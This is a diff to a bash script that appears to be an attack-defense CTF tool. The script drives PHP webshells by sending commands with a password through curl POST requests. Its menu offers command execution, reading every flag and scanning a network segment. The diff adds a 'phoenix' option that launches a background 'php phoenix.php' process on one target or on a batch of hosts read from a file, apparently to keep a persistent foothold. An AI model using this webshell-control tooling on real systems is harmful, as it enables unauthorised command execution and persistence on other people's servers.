@@ -1,7 +1,7 @@
 #!  /bin/bash
 
 passwd="p4rr0t"
-target="http://127.0.0.1/.a.php"
+target="http://127.0.0.1/.api.php"
 segment="4.4.*.100-101"
 
 
@@ -38,6 +38,35 @@ function phpEval(){
     curl -d "pass=$passwd&a=$2" $1
 }
 
+function phoenix(){
+    logInfo "1. Single"
+    logInfo "2. Batch"
+    echo -e -n "\033[35m>\033[0m"
+    read choice
+    case $choice in
+        1)
+            logInfo "Input Target>"
+            read target
+            cmd='php phoenix.php &'
+            shellExec $target $cmd
+            ;;
+        2)
+            i=1
+            hosts=$(cat target.txt)
+            for target in $hosts
+            do
+                cmd='php phoenix.php &'
+                logInfo "$i. $target"
+                i=$((i+1))
+                shellExec $target $cmd
+            done
+            ;;
+        *)
+            echo "Error Choice"
+            ;;
+    esac
+}
+
 function commandMode(){
     logInfo "Input Target url>"
     read target
@@ -63,7 +92,8 @@ function table(){
     logInfo "1. CommandMode"
     logInfo "2. ReadAllFlag"
     logInfo "3. SegmentScan"
-    logInfo "4. Exit"
+    logInfo "4. Phoenix"
+    logInfo "5. Exit"
     echo -e -n "\033[35m>\033[0m"
 }
 
@@ -99,6 +129,9 @@ function main(){
                 segmentScan
             ;;
             4)
+                phoenix
+            ;;
+            5)
                 break
             ;;
             *)
